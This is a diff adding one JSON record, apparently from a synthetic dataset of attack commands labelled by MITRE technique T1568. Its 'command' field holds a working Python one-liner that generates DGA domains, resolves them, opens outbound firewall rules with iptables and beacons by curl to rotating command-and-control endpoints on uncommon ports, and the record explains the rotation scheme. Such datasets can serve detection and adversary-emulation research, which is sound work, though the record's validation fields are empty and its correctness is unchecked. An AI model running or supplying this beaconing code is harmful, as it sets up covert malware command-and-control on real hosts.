@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess,time; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ttl-rotate'; tlds=['com','net']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:8]+'.'+tlds[i%len(tlds)] for i in range(n)]\nport=random.choice([18081,22443,12053])\nlast_ip=None\nfor cycle in range(2):\n    dom=random.choice(dga(12))\n    ttl=60; ip=None\n    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=dom,qtype='A')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for a in resp[DNS].an:\n            if getattr(a,'type',0)==1:\n                ip=a.rdata; ttl=getattr(a,'ttl',60); break\n    if ip and ip!=last_ip:\n        subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n        subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{dom}:{port}/beat'])\n        print('cycle',cycle,dom,ip,port,'ttl',ttl)\n        last_ip=ip\n    time.sleep(min(ttl,90))\"",
+  "explanation": "Performs TTL-aware re-resolution of DGA domains to rotate C2 endpoints over time, allowing egress per-selected IP and beaconing over uncommon ports.",
+  "rationale_steps": [
+    "Compute short-lived DGA domains each cycle.",
+    "Resolve via scapy and read TTL to inform rotation cadence.",
+    "Whitelist the resolved IP and port with iptables.",
+    "Beacon, sleep approximately the TTL, and rotate endpoints."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-0d8481e1",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
